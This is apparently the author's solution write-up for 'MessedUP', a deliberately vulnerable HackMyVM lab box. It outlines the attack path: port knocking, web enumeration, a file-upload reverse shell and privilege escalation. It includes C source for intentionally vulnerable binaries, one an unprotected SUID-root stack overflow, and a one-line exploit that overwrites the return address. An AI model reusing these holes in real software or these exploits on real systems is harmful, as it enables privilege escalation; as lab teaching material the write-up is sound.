**Dated:** 12 Jan 2021

**Solution** for the **MessedUP** linux box -  I made for **HackMyVM** site ~ Made and tested in VMWare Workstation
> 1. Avoid rabbit holes
> 1. Connect to FTP (port 8080) as anon user and download/read the file
> 1. Connect to tftp and download 125.zip file
> 1. Extract it (script below)
> 1. Portknocking sequence revelaed (8721, 45000, 9191)
> 1. Enumerate the webserver (port 65,000)
> 1. Try running gobuster against it
> 1. Any useful directory found ??? (yes, found -> projects)
> 1. /projects/index.php (Upload Media Center)
> 1. What about arbitary file upload vulnerability for getting RCE / Rev Shell? (uploaded_files)
> 1. Exploit passwordstrength binary (location: /usr/bin/passwordStrengthApp.exe) and then overspill binary (/home/skinny/.reload)
> 1. Become root 

**Name: passwordstrength app**\
On Kali box create vulnerable application by running: `gcc -m32 passwordstrength.c -o passwordstrength.exe`\
Copy the `.exe` to `Debian10 - 32bit`\
Chown it to skinny:skinny & allow all to READ/EXECUTE this.
```c
#include<stdio.h>
#include<string.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>

int main ()
{
char *str = NULL;
FILE * fPtr;

printf("Welcome to ***Password Strength Assessment*** Application v01 \nDesigned by: https://grumpygeekwrites.wordpress.com\n");

fPtr = fopen("3l3.txt", "r");

if(fPtr == NULL)
	    {
	 /* Unable to open file hence exit */
	printf("Unable to open file.\n");
	printf("Please check whether file exists and you have read privilege.\n");
	exit(EXIT_FAILURE);	
	    }

else
{
char c;
while((c=fgetc(fPtr))!=EOF)
{
	 printf("%c",c);
}

        fclose(fPtr);
}

printf("\nPlease enter input:");

scanf("%ms",&str);
  
if (str) 
	{
	printf("Your input was:%s\n",str);
	free(str);
	printf("-_____- Hmmmm let me analzye this -_____- \n");
	sleep(1.25);
	int loop=0;
	int upper=15;
	int lower=3;
	int runtime=0;
	srand(time(0));
	runtime=(rand() % (upper - lower + 1)) + lower;
	for (loop=0;loop<=runtime;loop++)
		{
		printf("\nIam tired, let me sleep please **__** %d",loop);
	       	printf("\nAhhh I hate being ... Ahhhhhhhhh, stop it");
		printf("\nLet me try again ... Although I dont have any energy\n\n");	
		}
	
	printf("Iam going off now, sorry to disappoint you ¯_(ツ)_/¯¯_(ツ)_/¯¯_(ツ)_/¯, will try someother time\n");	
	}

else if (str == "I have a laptop and computer in year2020")
	{
	printf("\n WoW!!! here are some of the notes of 'grumpygeek' regarding passwords");
	printf("\nworstpasswordexamples");
	printf("\nweakpassword 1->  password");
	printf("\nweakpassword 2-> newbie");
	printf("\nweakpassword 3-> KBQWW2LTORQW4CQ=");
	printf("\nweakpassord 4-> MNZGSY3LMV2AU===");

	printf("\ngoodpasswordexamples");
	printf("\nstrongpassword 1-> N.CagewasInConAirMovie");
	printf("\nstrongpassword 2-> KNUG6YLJMJAWW2DUMFZDCMBQL5RG653MONDGC43UBI======");
	printf("\nstrongpassword 3-> NFYHA43FMMXHE33DNNZQ====");
	printf("\nstrongpassword 4-> Pakistani Mangoes are great in taste");
	}

else
	{
	printf("Give me some input please, I am not an idiot :-/");
	}
  return 0;
}
```
**Solution**
> 1. strings passwordstrength.exe
> 1. try base32 decoding strings as one of them is a valid password for user skinny.


**Name: overspill app**\
On Kali box create vulnerable application by running: `gcc -fno-stack-protector -z execstack -no-pie -m32 -mpreferred-stack-boundary=2 overspill.c -o overspill.obj`\
Copy the `overspill.obj` to `Debian10 - 32bit`\
Chown it to root:root & give set the SUID bit set.\
"shadow_backup_sensitiveFile" will have the SHA512 hash of root.

```c
#include <stdio.h>                                                                                                                                          
#include <string.h>                                                                                                                                         
#include <stdlib.h>                                                                                                     
#include <sys/types.h>                                                                                                            
#include <unistd.h>                                                                                                                                         
                                
int main()                                                                                                                        
{                                                                             
int temp=0;                            
char userinput[23];                                                                                                                                         
printf("\n*** Welcome to Overspill software v2.0 ~ by MicrooSooft (° ʖ °)*** \n");                                                                                                                   
printf("\nCreation date: ~19Nov2020");                                                           
printf("\nPlease enter your input:");                                                                                                                       
scanf("%s",&userinput);                    
printf("Your input was -> %s\nNice Input, I liked it\nByeBye (｡◕‿◕｡)\n",userinput);                                                                                           


return 0;                                       
}                                               

void read_sensitive_file(void)                                                                   
{                                               
        printf("\nWTF!!! How the hell, did you get into this secret function\n");                                                                                                                  
        setuid(0);                                     
        setgid(0);                                     

        system("/bin/cat shadow_backup_sensitiveFile");
}
```

**Solution**
> 1. strings overspill.obj (can be skipped)
> 1. readelf -s ./overspill.obj | grep read (notedown the address)
> 1. inside python ---> import pwn; pwn.p32(0x<the address); 
> 1. the above command will convert the address into little endian.
> 1. python -c 'print("A"*35+"<Little Endian HEX address of read_sensitive_file")' | ./overspill.obj

**Name: createZIP.py**
```python
import os
import time

loop=0;

while loop <= 125:
    loop_value = str(loop)
    filename = loop_value+'.zip'

    if (loop == 0):
        os.system("zip " +filename+ " notes.txt")

    else:
        time.sleep(1)
        previous_value = loop - 1
        previous_value = str(previous_value)+".zip"
        os.system("zip " +filename+" "+previous_value)
        os.system("rm " +previous_value)

    loop=loop+1
```

**Name: ZIPextractor.py**
```python
import os;
import time;
loop = 125

while loop >= 0:
    time.sleep(0.1)
    filename=str(loop)+'.zip'
    os.system("unzip "+filename)
    os.system("rm "+filename)
    loop = loop -1
```
